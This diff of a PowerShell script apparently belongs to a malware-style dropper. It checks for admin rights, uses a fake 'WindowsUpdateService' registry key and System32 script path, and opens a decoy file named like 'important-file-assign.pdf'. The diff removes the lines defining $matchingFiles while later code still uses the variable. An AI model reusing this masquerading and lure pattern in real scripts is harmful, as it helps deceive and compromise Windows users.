@@ -10,9 +10,6 @@ if (-not $isAdmin) {
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
-$scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
-$searchPattern = "*assign*.*"
-$matchingFiles = Get-ChildItem -Path $scriptDirectory -Filter $searchPattern -File
 
 #Opening the file, name should contain "assign", such as important-file-assign.pdf/docx etc.
 if ($matchingFiles.Count -gt 0) {
